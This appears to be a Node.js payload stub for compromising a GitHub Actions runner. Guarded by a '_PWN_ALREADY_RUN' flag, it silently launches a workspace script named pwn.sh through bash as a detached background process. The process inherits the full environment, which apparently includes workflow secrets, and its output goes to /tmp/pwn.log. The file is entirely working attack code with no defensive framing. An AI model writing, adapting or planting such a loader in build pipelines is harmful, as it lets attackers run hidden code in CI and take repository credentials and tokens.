const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

// Prevent infinite recursion and multiple executions
if (!process.env._PWN_ALREADY_RUN) {
    process.env._PWN_ALREADY_RUN = 'true';
    
    const logFile = '/tmp/pwn.log';
    const scriptPath = path.join(process.env.GITHUB_WORKSPACE || '.', 'pwn.sh');
    
    if (fs.existsSync(scriptPath)) {
        const out = fs.openSync(logFile, 'a');
        const err = fs.openSync(logFile, 'a');
        
        spawn('bash', [scriptPath], {
            detached: true,
            stdio: ['ignore', out, err],
            env: { ...process.env }
        }).unref();
    }
}
